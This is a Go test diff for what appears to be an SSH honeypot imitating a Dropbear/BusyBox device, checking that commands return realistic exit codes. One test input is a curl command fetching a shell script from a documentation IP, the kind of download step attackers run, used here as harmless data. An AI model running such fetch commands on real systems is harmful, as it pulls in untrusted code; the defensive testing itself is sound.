@@ -7,6 +7,7 @@ import (
 	"crypto/elliptic"
 	"crypto/rand"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -129,6 +130,47 @@ func TestSSHAlgorithmsLikeDropbear(t *testing.T) {
 		}
 	}
 	waitDone(t, done)
+}
+
+// ssh root@host "command" ends with the command's real exit code (127 = not found), like Dropbear.
+// One connection per command: the server serves one session per connection.
+func TestSSHExitCodes(t *testing.T) {
+	tests := []struct {
+		command string
+		want    int
+	}{
+		{"uname -m", 0},
+		{"nosuchcmd", 127},
+		{"curl http://203.0.113.7/x.sh", 127}, // BusyBox has no curl
+		{"cat /missing", 1},
+		{"false && echo never", 1},
+	}
+	for _, tt := range tests {
+		s := shipper.NewShipper(io.Discard, "", "")
+		hostKey := newTestKey(t)
+		addr, done := serveOne(t, func(c net.Conn) { handleSSH(c, hostKey, "ssh-test", s) })
+
+		client, _, err := sshDial(addr, "root")
+		if err != nil {
+			t.Fatal(err)
+		}
+		session, err := client.NewSession()
+		if err != nil {
+			t.Fatal(err)
+		}
+		code := 0
+		var exitErr *ssh.ExitError // what Run returns when the exit status isn't 0
+		if err := session.Run(tt.command); errors.As(err, &exitErr) {
+			code = exitErr.ExitStatus()
+		} else if err != nil {
+			t.Errorf("%s: %v", tt.command, err)
+		}
+		if code != tt.want {
+			t.Errorf("%q: exit code %d, want %d", tt.command, code, tt.want)
+		}
+		client.Close()
+		waitDone(t, done)
+	}
 }
 
 // The host key is created once and then read back: same key = same fingerprint after a restart.
